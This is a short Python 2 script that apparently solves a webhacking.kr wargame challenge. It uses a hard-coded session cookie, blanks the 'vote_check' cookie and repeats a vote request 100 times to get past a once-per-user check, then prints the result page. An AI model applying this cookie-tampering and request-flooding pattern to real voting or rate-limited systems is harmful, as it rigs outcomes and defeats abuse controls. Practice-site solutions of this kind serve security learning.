#-*- coding: utf-8 -*-
import urllib2
import CookieManager

httpConnection = None

challengeUrl = "http://webhacking.kr/challenge/codeing/code5.html?hit=bindon"
CookieManager.addCookie("PHPSESSID", "a90f69bdc1cdceaf479ca1ebcd368d29")
CookieManager.addCookie("vote_check", "")
httpRequest = urllib2.Request(challengeUrl)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    for idx in range(0, 100):
        httpConnection = urllib2.urlopen(httpRequest)
        httpResponse = httpConnection.read()
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

challengeUrl = "http://webhacking.kr/challenge/codeing/code5.html"
CookieManager.addCookie("PHPSESSID", "a90f69bdc1cdceaf479ca1ebcd368d29")
httpRequest = urllib2.Request(challengeUrl)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
    
